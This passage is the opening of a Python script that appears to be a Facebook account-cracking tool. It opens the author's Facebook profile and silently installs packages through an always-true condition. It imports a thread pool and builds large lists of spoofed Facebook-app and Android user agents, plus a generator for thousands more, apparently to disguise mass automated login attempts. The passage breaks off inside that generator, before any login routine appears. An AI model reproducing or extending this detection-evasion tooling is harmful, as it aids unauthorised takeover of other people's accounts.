
# File: AHMEDO_py.marhsal_saju_x_error

import os
print('\x1b[1;97mFirst Join My Fb Group')
os.system('xdg-open https://www.facebook.com/profile.php?id=100085482740170/')
import uuid
import os
import sys
import time
import json
import random
import re
import string
import platform
import base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
if ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
A = '\x1b[1;90m'
BN = '\x1b[1;107m'
BBL = '\x1b[1;106m'
BP = '\x1b[1;105m'
BB = '\x1b[1;104m'
BK = '\x1b[1;103m'
BH = '\x1b[1;102m'
BM = '\x1b[1;101m'
BA = '\x1b[1;100m'
my_color = [
    P,
    M,
    H,
    K,
    B,
    U,
    O,
    N]
warna = random.choice(my_color)
agentsxyz = [
    'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-A146U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-A037U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-A326U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',
    'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG-SM-J326AZ Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]',
    'Mozilla/5.0 (Linux; Android 13; SM-A226B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',
    'Mozilla/5.0 (Linux; Android 13; SM-G781U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',
    'Mozilla/5.0 (Linux; Android 13; SM-A716S Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]',
    'Mozilla/5.0 (Linux; Android 13; SM-M236L Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]',
    'Mozilla/5.0 (Linux; Android 13; SM-A826S Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]',
    'Mozilla/5.0 (Linux; Android 13; SM-G781B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]',
    'Mozilla/5.0 (Linux; Android 13; SM-A716S Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',
    'Mozilla/5.0 (Linux; Android 9; SM-J330FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',
    'Mozilla/5.0 (Linux; Android 13; SM-A515F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',
    'Mozilla/5.0 (Linux; Android 10; SC-02L Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]',
    'Mozilla/5.0 (Linux; Android 11; SM-A105FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]',
    'Mozilla/5.0 (Linux; Android 10; SM-J600G Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.155 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]',
    'Mozilla/5.0 (Linux; Android 10; TECNO KC8 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/363.0.0.6.63;]',
    'Mozilla/5.0 (Linux; Android 10; TECNO KC8 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.217 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]',
    'Mozilla/5.0 (Linux; Android 9; TECNO KC8 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/323.0.0.9.106;]',
    'Mozilla/5.0 (Linux; Android 10; TECNO KC8 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]',
    'Mozilla/5.0 (Linux; U; Android 9; en-us; TECNO KC8 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36 PHX/13.2',
    'Mozilla/5.0 (Linux; Android 10; TECNO KC8 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/364.0.0.14.77;]',
    'Mozilla/5.0 (Linux; Android 9; TECNO KC2j Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/358.0.0.8.62;]',
    'Mozilla/5.0 (Linux; U; Android 10; pt-br; TECNO KC8 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 PHX/13.0',
    'Mozilla/5.0 (Linux; Android 10; TECNO KC8 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/354.0.0.8.108;]',
    'Mozilla/5.0 (Linux; Android 9; TECNO KC8 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]',
    'Mozilla/5.0 (Linux; Android 9; TECNO KC2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/403.1.0.17.106;]',
    'Mozilla/5.0 (Linux; Android 9; TECNO KC2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]',
    'Mozilla/5.0 (Linux; U; Android 10; en-us; TECNO KC8 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36 PHX/12.3',
    'Mozilla/5.0 (Linux; Android 9; TECNO KC2j Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]',
    'Mozilla/5.0 (Linux; U; Android 10; en-us; TECNO KC8 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36 PHX/12.0',
    'Mozilla/5.0 (Linux; U; Android 10; pt-pt; TECNO KC8 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36 PHX/12.2',
    'Mozilla/5.0 (Linux; U; Android 10; en-us; TECNO KC8 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36 PHX/11.4',
    'Mozilla/5.0 (Linux; Android 10; TECNO KC8 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/311.0.0.7.114;]',
    'Mozilla/5.0 (Linux; Android 10; TECNO KE5 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/291.0.0.44.120;]',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36 115Browser/24.2.0.2',
    'Mozilla/5.0 (Linux; Android 12; Infinix X6517 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]',
    'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X622 Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]',
    'Mozilla/5.0 (Linux; Android 11; Infinix X697 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',
    'Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]',
    'Mozilla/5.0 (Linux; Android 11; Infinix X697 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/364.1.0.25.132;]',
    'Mozilla/5.0 (Linux; Android 11; Infinix X689D Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',
    'Mozilla/5.0 (Linux; Android 11; Infinix X689C Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]',
    'Mozilla/5.0 (Linux; Android 12; Infinix X668C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',
    'Mozilla/5.0 (Linux; Android 13; Infinix X6835B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safar',
    'Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',
    'Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',
    'Mozilla/5.0 (Linux; Android 11; Infinix X6811 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]',
    'Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]',
    'Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]',
    'Mozilla/5.0 (Linux; Android 12; Infinix X6516 Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.132 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]',
    'Mozilla/5.0 (Linux; Android 11; Infinix X689D Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',
    'Mozilla/5.0 (Linux; Android 12; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36v',
    'Mozilla/5.0 (Linux; Android 12; moto g stylus 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; moto g 5G (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; moto g power (2022)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; moto g power (2021)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36']

def uaxxx():
    ua = '[FBAN/FB4A;FBAV/83.0.0.5091;FBBV/8586033;FBDM/{density=1,width=720,height=1280};FBLC/en_US;FBRV/5718626;FBCR/null;FBMF/sony Ericsson Xperia U;FBBD/sony Ericsson Xperia U;FBPN/com.facebook.katana;FBDV/;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return ua

ua = [
    'Dalvik/2.1.0 (Linux; U; Android 12; SM-A217F Build/SP1A.210812.016) [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/12;FBAB/com.miniclip.carrom;FBAV/15.2.0;FBBV/931;FBVS/6.16.0;FBLC/en_GB]']
ua = 'RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
ua = [
    'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X606B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-181-5) [FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1;]']
ua = [
    'Mozilla/5.0 (Linux; Android 11; Mi 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 13; M2103K19G Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/416.0.0.9.76;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/491071575;FBCR/JAZZTEL;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2103K19G;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.375,width=1080,height=2138};FB_FW/1;] FBBK/1']
ua = [
    'Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36']
ua = [
    'Dalvik/2.1.0 (Linux; Android 10; POCOPHONE F1) [FBAN/MobileAdsManagerAndroid;FBAV/324.0.0.28.115;FBBV/464692125;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/POCOPHONE;FBBF/Poco;FBDV/Poco F1;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]']
ua = [
    'Mozilla/5.0 (Linux; Android 13; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 7 MIUI/V10.3.6.0.PFGEUXM) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/182747450;FBCR/MASMOVIL;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1']
ua = [
    'Mozilla/5.0 (Linux; Android 13; CPH2357) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.167 Mobile Safari/537.36']

def swag():
    oppo = random.choice([
        'CNM632',
        'CPH1923',
        'CPH1114',
        'CPH1235',
        'CPH1451',
        'CPH1615',
        'CPH1664',
        'CPH1869',
        'CPH1929',
        'CPH1985',
        'CPH2048',
        'CPH2107',
        'CPH2238',
        'CPH2261',
        'CPH2331',
        'CPH2332',
        'CPH2351',
        'CPH2389',
        'CPH2451',
        'CPH2491',
        'CPH2513',
        'CPH2515',
        'CPH2519',
        'CPH2521',
        'CPH2523',
        'CPH2525',
        'CPH2529',
        'CPH2551',
        'CPH2569',
        'CPH2579',
        'CPH2589',
        'CPH2591',
        'CPH2643',
        'CPH3475',
        'CPH3669',
        'CPH3682',
        'CPH3731',
        'CPH3776',
        'CPH3785',
        'CPH4125',
        'CPH4275',
        'CPH4299',
        'CPH4395',
        'CPH4473',
        'CPH4987',
        'CPH5286',
        'CPH5841',
        'CPH5947',
        'CPH6178',
        'CPH6244',
        'CPH6271',
        'CPH6316',
        'CPH6519',
        'CPH6528',
        'CPH6697',
        'CPH7338',
        'CPH7364',
        'CPH7382',
        'CPH7532',
        'CPH7577',
        'CPH7948',
        'CPH7991',
        'CPH8153',
        'CPH8346',
        'CPH8347',
        'CPH8363',
        'CPH8393',
        'CPH8467',
        'CPH8472',
        'CPH8534',
        'CPH8686',
        'CPH8893',
        'CPH9177',
        'CPH9226',
        'CPH9659',
        'CPH9667',
        'CPH9716',
        'CPH9763',
        'CPH9839',
        'CPH9929'])
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(111, 999)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/' + str(random.randint(111, 999)) + '.0.0.48.' + '122;FBBV/' + str(random.randint(1111111, 9999999)) + ';FBDM/{density=2' + '.0,width=' + '720,height=' + '1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/' + str(oppo) + ';FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
    return ua


def uaxxx():
    ua = '[FBAN/FB4A;FBAV/83.0.0.5091;FBBV/8586033;FBDM/{density=1,width=720,height=1280};FBLC/en_US;FBRV/5718626;FBCR/null;FBMF/sony Ericsson Xperia U;FBBD/sony Ericsson Xperia U;FBPN/com.facebook.katana;FBDV/;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return ua

uaku2 = []
ugen2 = []
ugen = []
for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; U; Android 11;'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = 'fr-fr; Redmi Note 11 Build/'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = ' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 13;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Redmi Note 10 Pro'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 10;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Redmi Note 10 Pro'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 12;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Redmi Note 10 Pro'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80, 103)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])
    c = random.choice([
        'Redmi Note 10 Pro'])
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
